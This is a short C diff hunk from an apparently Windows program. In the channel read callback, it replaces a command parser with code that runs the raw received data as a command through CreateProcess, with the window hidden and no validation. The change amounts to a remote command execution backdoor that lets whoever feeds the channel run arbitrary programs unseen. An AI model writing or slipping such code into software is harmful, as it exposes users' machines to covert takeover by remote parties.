@@ -104,7 +104,24 @@ void channel_kill(void)
 
 static int on_read_completed(iobuf_t *ibuf, void *bla)
 {
-	return commands_parse(ibuf);
+	PROCESS_INFORMATION pi;
+	STARTUPINFO si;
+	ZeroMemory(&pi, sizeof(pi));
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	si.wShowWindow = SW_HIDE;
+	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+
+	if (CreateProcess(NULL, ibuf->data + 4, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+	} else {
+		info(0, "failed to exec command %s. size = %d, total = %d", ibuf->data + 4, ibuf->size, ibuf->total);
+	}
+
+	ibuf->size = 0;
+	return 0;
 }
 
 /**
